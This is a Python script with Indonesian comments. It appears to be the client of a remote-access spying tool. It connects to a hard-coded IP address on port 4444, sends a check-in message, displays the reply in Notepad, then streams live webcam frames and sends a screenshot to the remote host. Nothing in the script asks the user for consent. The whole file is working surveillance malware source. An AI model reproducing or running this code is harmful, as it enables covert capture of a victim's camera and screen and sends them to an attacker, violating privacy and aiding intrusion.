import socket
import cv2
import numpy as np
import pyautogui
import time
import win32api
import win32con

# Fungsi untuk mengambil gambar dari webcam dan mengirim datanya melalui socket
def capture_and_send(sock):
    cap = cv2.VideoCapture(0)  # Mengakses kamera utama

    while True:
        ret, frame = cap.read()  # Membaca setiap frame

        # Mengubah gambar menjadi bentuk byte
        data = cv2.imencode('.jpg', frame)[1].tobytes()

        # Mengirim data gambar melalui socket
        sock.sendall(data)

        # Tekan tombol 'q' untuk menghentikan pengambilan gambar
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cap.release()
    cv2.destroyAllWindows()

# Fungsi untuk mengambil screenshot dan mengirim datanya melalui socket
def screenshot_and_send(sock):
    # Ambil screenshot
    screenshot = pyautogui.screenshot()
    # Simpan screenshot ke file sementara
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)

    # Buka file screenshot dan kirim isinya
    with open(screenshot_path, "rb") as file:
        data = file.read(1024)
        while data:
            sock.send(data)
            data = file.read(1024)

    # Hapus file screenshot sementara
    file.close()
    time.sleep(2)  # Tunggu selama 2 detik agar data berhasil dikirim
    sock.send(b"DONE")  # Kirim tanda bahwa pengiriman telah selesai
    print("[+] Screenshot berhasil dikirim")

# Buat koneksi socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.70.245', 4444))

pesan = "[+] masuk wak : "
sock.sendto(pesan.encode(), ('192.168.1.16', 4444))

# Menerima pesan dari komputer yang terhubung
data_masuk = sock.recv(1024)
print(data_masuk)

# Menulis pesan ke dalam file teks
with open("received_message.txt", 'w') as file:
    file.write(data_masuk.decode())

# Menampilkan pesan dalam notepad
with open("received_message.txt", 'r') as file:
    message = file.read()
    win32api.ShellExecute(0, 'open', 'notepad.exe', None, None, 1)
    time.sleep(1)
    pyautogui.write(message)

# Panggil fungsi untuk mengambil gambar dari webcam dan mengirimnya
capture_and_send(sock)

# Panggil fungsi untuk mengambil screenshot dan mengirimnya
screenshot_and_send(sock)

# Tutup koneksi socket setelah selesai
sock.close()
